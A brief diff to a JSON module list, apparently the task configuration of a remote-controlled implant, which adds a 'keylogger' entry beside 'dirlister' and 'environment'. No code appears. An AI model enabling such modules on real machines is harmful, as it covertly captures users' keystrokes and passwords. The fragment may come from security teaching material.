@@ -1,4 +1,6 @@
 [
     { "module" : "dirlister" },
-    { "module" : "environment" }
+    { "module" : "environment" },
+    { "module" : "keylogger" }
+    
 ]
